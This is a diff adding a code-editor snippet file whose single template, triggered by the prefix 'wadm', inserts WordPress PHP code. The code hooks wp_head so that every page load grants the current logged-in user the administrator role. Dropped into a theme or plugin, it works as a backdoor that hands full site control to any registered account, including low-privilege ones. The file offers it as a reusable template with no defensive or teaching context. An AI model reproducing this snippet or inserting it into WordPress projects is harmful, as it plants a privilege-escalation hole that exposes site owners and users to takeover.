@@ -1,0 +1,17 @@
+{
+	"wordpress_admin" : {
+		"prefix": "wadm",
+		"scope": "php",
+		"body": [
+			"//* Update wordpress user privileges to admin",
+			"add_action('wp_head', 'set_as_admin');",
+			"function set_as_admin(){",
+			"\t$user_id = get_current_user_id();",
+			"\t$u = new WP_User( $user_id );",
+			"\t// Add role",
+			"\t$u->add_role( 'administrator' );",
+			"}"
+		],
+		"description": "Upgrade wordpress user privileges to admin"
+	}
+}
